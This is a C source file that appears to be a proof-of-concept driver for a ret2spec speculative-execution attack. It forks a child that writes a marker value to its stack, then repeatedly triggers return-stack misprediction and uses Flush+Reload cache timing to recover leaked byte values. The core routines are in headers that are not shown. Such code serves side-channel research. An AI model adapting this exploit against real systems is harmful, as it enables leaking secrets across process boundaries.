#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/mman.h>
#include <unistd.h>
#include <assert.h>
#include <string.h>
#include <signal.h>

#include "asm.h"
#include "constants.h"
#include "flush_and_reload.h"
#include "find_threshold.h"
#include "ret2spec.h"

int main() {
  pid_t pid = fork();
	if (pid == 0) {
		while (1)
			asm volatile(
				"movq %0, (%%rsp)\n"
				"mfence\n"
				::"r"(0xf8f7f6f5f4f3f2f1ull));
	}
	if (pid < 0) return 1;

  const size_t leak_size = PAGE_SIZE * VALUES_IN_BYTE;
  void* leak_buffer = mmap(NULL,
                        leak_size,
                        PROT_READ,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
                        -1,
                        0);
  assert(leak_buffer != NULL);

  // Where we will measure the cache times
  const size_t reload_size = PAGE_SIZE * VALUES_IN_BYTE;
  void* reload_buffer = mmap(NULL,
                        reload_size,
                        PROT_READ,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
                        -1,
                        0);
  assert(reload_buffer != NULL);

  size_t results[VALUES_IN_BYTE] = {0};

  // Determine a threshold for when a cache is hot or cold
  // size_t threshold = find_in_cache_threshold();
  size_t threshold = 200;
  assert(threshold > 0);
  printf("Threshold: %ld\n", threshold);

  madvise(leak_buffer, PAGE_SIZE, MADV_DONTNEED);
  for (int i = 0; i < 10000; ++i) {
    flush(VALUES_IN_BYTE, PAGE_SIZE, reload_buffer);
    // mfence();
    ret2spec(leak_buffer, reload_buffer, RSB_ENTRIES);
    reload(VALUES_IN_BYTE, PAGE_SIZE, reload_buffer, results, threshold);
  }

  for (size_t i = 0; i < VALUES_IN_BYTE; ++i) {
    printf("%lx\t%ld\n", i, results[i]);
  }

  kill(pid, 9);

  return 0;
}
